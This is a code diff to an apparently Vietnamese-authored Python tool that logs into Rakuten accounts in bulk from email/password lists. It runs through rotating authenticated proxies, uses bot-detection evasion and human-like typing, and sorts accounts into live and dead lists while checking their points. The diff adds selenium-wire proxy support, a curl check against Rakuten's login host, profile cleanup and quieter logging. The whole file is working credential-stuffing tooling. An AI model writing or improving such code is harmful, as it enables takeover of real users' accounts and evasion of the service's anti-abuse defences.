@@ -20,7 +20,10 @@ import chromedriver_autoinstaller
 import psutil
 import shutil
 import requests
-
+from seleniumwire import webdriver
+from selenium.webdriver.chrome.options import Options
+from webdriver_manager.chrome import ChromeDriverManager
+from selenium.webdriver.chrome.service import Service
 colorama.init()
 
 drivers = []
@@ -123,7 +126,8 @@ logging.getLogger('seleniumwire.handler').setLevel(logging.WARNING)
 logging.getLogger('seleniumwire.proxy').setLevel(logging.WARNING)
 logging.getLogger('seleniumwire.thirdparty').setLevel(logging.WARNING)
 logging.getLogger('seleniumwire.thirdparty.mitmproxy').setLevel(logging.WARNING)
-
+logging.getLogger('WDM').setLevel(logging.WARNING)
+os.environ['WDM_LOG'] = '0'
 # Suppress specific warnings
 import warnings
 warnings.filterwarnings("ignore", category=UserWarning, module="seleniumwire")
@@ -132,7 +136,6 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 warnings.filterwarnings("ignore", message="Cache folder")
 warnings.filterwarnings("ignore", message=".*cannot be created.*")
 warnings.filterwarnings("ignore", message=".*Permission denied.*")
-
 # Global variables
 file_lock = threading.Lock()
 show_browser = True
@@ -199,7 +202,13 @@ def wait_for_document_loaded(driver, timeout=10):
                 pass  # Driver might not be ready yet
             time.sleep(1)
         return False
-    
+def test_proxy_with_curl(proxy_address, test_url="https://login.account.rakuten.com"):
+  """Kiểm tra proxy bằng một lệnh curl đơn giản."""
+  try:
+      os.system(f"curl -x {proxy_address} {test_url} --max-time 10")
+  except:
+      pass
+
 def init_driver(proxy=None, email=None, row=0, col=0, size=(1366, 768)):
     """Khởi tạo Chrome driver với cài đặt không bị phát hiện"""
     options = uc.ChromeOptions()
@@ -239,23 +248,48 @@ def init_driver(proxy=None, email=None, row=0, col=0, size=(1366, 768)):
         version_main = int(version_main.split('.')[0])
     except:
         version_main = None
-    
-    driver = uc.Chrome(
-        options=options,
-        version_main=version_main,
-        use_subprocess=True,
-        headless=(not show_browser)
-    )
+
+    driver = None
     
     # Set window position and size
     if show_browser:
+        driver = uc.Chrome(
+            options=options,
+            version_main=version_main,
+            use_subprocess=True,
+            headless=(not show_browser)
+        )
         width, height = size
         x = col * width
         y = row * height
         driver.set_window_rect(x=x, y=y, width=width, height=height)
     else:
-        driver.set_window_size(1366, 768)
-    
+        try:
+            username, password = proxy.get('credentials', '').split(':')
+            host, port = proxy.get('host_port', '').split(':')
+            proxy_options = {
+                'proxy': {
+                    'http': f'http://{username}:{password}@{host}:{port}',
+                    'https': f'http://{username}:{password}@{host}:{port}',
+                    'no_proxy': 'localhost,127.0.0.1'
+                }
+            }
+            chrome_options = Options()
+            chrome_options.add_argument('--headless=new')
+            driver = webdriver.Chrome(
+                service=Service(ChromeDriverManager().install()),
+                seleniumwire_options=proxy_options,
+                options=chrome_options
+            )
+        except:
+            driver = uc.Chrome(
+                options=options,
+                version_main=version_main,
+                use_subprocess=True,
+                headless=(not show_browser)
+            )
+            test_proxy_with_curl(f"{proxy['credentials']}@{proxy['host_port']}")
+
     # Anti-detection scripts
     driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
         "source": """
@@ -284,7 +318,7 @@ def init_driver(proxy=None, email=None, row=0, col=0, size=(1366, 768)):
         except Exception as e:
             logging.warning(f"Lỗi khi cài đặt proxy: {e}")
     
-    return driver
+    return driver, user_data_dir
 
 def human_type(element, text, min_delay=0.05, max_delay=0.15):
     """Type text with human-like delay"""
@@ -306,7 +340,7 @@ def wait_for_element(driver, by, value, timeout=10, clickable=False):
             )
         return element
     except Exception as e:
-        logging.error(f"Không tìm thấy element {value}: {repr(e)}")
+        # logging.error(f"Không tìm thấy element {value}: {repr(e)}")
         raise
 
 def safe_click(driver, element):
@@ -387,7 +421,7 @@ def _enter_email(driver, email):
     """Enter email in login form"""
     try:
         # Wait for email input field
-        email_input = wait_for_element(driver, By.NAME, "username", timeout=10)
+        email_input = wait_for_element(driver, By.NAME, "username", timeout=30)
         
         # Type email with human-like delay
         human_type(email_input, email)
@@ -400,14 +434,14 @@ def _enter_email(driver, email):
         return True
         
     except Exception as e:
-        logging.error(f"Lỗi khi nhập email: {repr(e)}")
+        # logging.error(f"Lỗi khi nhập email: {repr(e)}")
         return False
 
 def _enter_password(driver, password, email):
     """Enter password in login form"""
     try:
         # Wait for password input field
-        password_input = wait_for_element(driver, By.NAME, "password", timeout=10)
+        password_input = wait_for_element(driver, By.NAME, "password", timeout=30)
         
         # Type password with human-like delay
         human_type(password_input, password)
@@ -422,7 +456,7 @@ def _enter_password(driver, password, email):
         return True
         
     except Exception as e:
-        logging.error(f"Lỗi khi nhập password cho {email}")
+        # logging.error(f"Lỗi khi nhập password cho {email}")
         return False
 
 def _check_login_success(driver, email):
@@ -448,7 +482,7 @@ def _check_login_success(driver, email):
             except:
                 pass
             
-            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
+            # logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
             return False
         
         return True
@@ -525,12 +559,14 @@ def _check_points(driver, email, password):
         logging.warning(f"Lỗi khi kiểm tra điểm cho {email}: {repr(e)}")
         return True, "Đăng nhập thành công nhưng lỗi kiểm tra điểm"
 
-def process_account(driver, account, account_index):
+def process_account(driver,user_data_dir, account, account_index):
     """Xử lý đăng ký một tài khoản"""
     email, password = account['email'], account['password']
     try:
         logging.debug(f"Đang xử lý tài khoản {account_index + 1}: {email}")
         success, message = check_rakuten_account(driver, email, password)
+        if not success:
+            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
         with file_lock:
             if success:
                 successful_accounts.append(account)
@@ -549,6 +585,15 @@ def process_account(driver, account, account_index):
             failed_accounts.append({'account': account, 'error': repr(e)})
             with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                 f.write(f"{email}|{password}|{'Acc lock hoặc lỗi pass'}\n")
+    finally:
+        # delete user_data_dir
+        for _ in range(3):
+            try:
+                if user_data_dir and os.path.exists(user_data_dir):
+                    shutil.rmtree(user_data_dir, ignore_errors=True)
+            except:
+                time.sleep(5)
+            
 
 def clean_all_user_data(retries=5, delay=1):
     """Dọn dẹp tất cả thư mục dữ liệu người dùng"""
@@ -561,13 +606,13 @@ def clean_all_user_data(retries=5, delay=1):
                 logging.info("Đã dọn dẹp dữ liệu người dùng thành công.")
                 break
             except PermissionError:
-                logging.debug(f"Đang dọn dẹp dữ liệu. Thử lại sau {delay}s...")
+                # logging.debug(f"Đang dọn dẹp dữ liệu. Thử lại sau {delay}s...")
                 time.sleep(delay)
             except Exception as e:
                 # logging.error(f"Lỗi không mong muốn khi dọn dẹp dữ liệu người dùng: {repr(e)}")
                 time.sleep(delay)
-        else:
-            logging.error(f"Không thể dọn dẹp dữ liệu người dùng sau {retries} lần thử.")
+        # else:
+            # logging.error(f"Không thể dọn dẹp dữ liệu người dùng sau {retries} lần thử.")
 
 def check_key_live():
     """Kiểm tra key có live không từ GitHub"""
@@ -661,7 +706,7 @@ def main():
                         row = account_index // col
                         col_index = account_index % col
                         size = (screen_width // col, 400)
-                        driver = init_driver(
+                        driver, user_data_dir = init_driver(
                             proxy=proxy, 
                             email=account['email'], 
                             row=row, 
@@ -670,7 +715,7 @@ def main():
                         )
                         drivers.append(driver)
                     
-                    process_account(driver, account, account_index)
+                    process_account(driver, user_data_dir, account, account_index)
                     
                 except Exception as e:
                     logging.error(f"Lỗi trong worker thread: {repr(e)}")
